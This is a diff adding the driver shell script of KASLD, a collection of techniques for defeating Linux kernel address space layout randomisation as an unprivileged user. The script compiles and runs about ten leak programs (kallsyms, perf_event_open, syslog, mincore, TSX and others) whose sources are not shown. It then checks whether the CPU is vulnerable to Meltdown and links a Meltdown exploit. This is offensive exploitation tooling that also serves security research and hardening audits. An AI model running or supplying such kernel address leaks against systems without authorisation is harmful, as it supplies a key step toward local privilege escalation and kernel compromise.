@@ -1,0 +1,84 @@
+#!/bin/sh
+# [ KASLD ] Kernel Address Space Layout Derandomization
+#
+# A collection of various techniques to bypass KASLR and retrieve
+# the Linux kernel base virtual address on x86 / x86_64 architectures
+# as an unprivileged user.
+# ---
+# 2019 - <bcoles@gmail.com>
+
+echo "[ KASLD ] Kernel Address Space Layout Derandomization"
+echo
+
+echo "Kernel release: $(uname -r)"
+echo "Kernel version: $(uname -v)"
+echo "Kernel arch:    $(uname -m)"
+echo
+
+if gcc default.c -o default -Wall; then
+  ./default
+  rm default
+  echo
+fi
+
+if gcc boot-config.c -o boot-config -Wall; then
+  ./boot-config
+  rm boot-config
+  echo
+fi
+
+if gcc cmdline.c -o cmdline -Wall; then
+  ./cmdline
+  rm cmdline
+  echo
+fi
+
+if gcc kallsyms.c -o kallsyms -Wall; then
+  ./kallsyms
+  rm kallsyms
+  echo
+fi
+
+if gcc nf_conntrack.c -o nf_conntrack -Wall; then
+  ./nf_conntrack
+  rm nf_conntrack
+  echo
+fi
+
+if gcc perf_event_open.c -o perf_event_open -Wall; then
+  ./perf_event_open
+  rm perf_event_open
+  echo
+fi
+
+if gcc syslog.c -o syslog -Wall; then
+  ./syslog
+  rm syslog
+  echo
+fi
+
+if gcc pppd_kallsyms.c -o pppd_kallsyms -Wall; then
+  ./pppd_kallsyms
+  rm pppd_kallsyms
+  echo
+fi
+
+if gcc mincore.c -o mincore -Wall; then
+  ./mincore
+  rm mincore
+  echo
+fi
+
+if gcc tsx-rtm.c -o tsx-rtm -Wall; then
+  ./tsx-rtm
+  rm tsx-rtm
+  echo
+fi
+
+echo "[.] checking /sys/devices/system/cpu/vulnerabilities ..."
+if grep -s -q Vulnerable /sys/devices/system/cpu/vulnerabilities/meltdown ; then
+  echo "CPU vulnerable to meltdown. Try meltdown exploit:"
+  echo "- https://github.com/paboldin/meltdown-exploit"
+  echo
+fi
+
